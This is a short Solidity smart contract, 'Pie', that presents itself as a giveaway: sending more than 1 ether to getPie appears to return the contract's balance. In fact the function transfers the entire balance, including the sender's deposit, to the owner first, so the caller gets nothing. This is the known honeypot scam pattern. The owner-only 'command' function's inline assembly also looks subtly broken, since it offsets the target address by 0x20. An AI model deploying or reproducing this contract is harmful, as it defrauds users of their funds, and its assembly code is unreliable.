pragma solidity ^0.4.19;

contract Pie {
    address public owner = msg.sender;

    function() public payable {}

    function getPie() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr != address(0));
        require(data.length > 0);

        bool success;
        bytes memory returnData;

        assembly {
            let ptr := mload(0x40)
            let size := mload(data)
            let addr := and(add(adr, 0x20), 0xffffffffffffffffffffffffffffffffffffffff)
            success := call(gas, addr, msg.value, add(data, 0x20), size, ptr, 0)
            returnData := ptr
        }

        require(success);
    }
}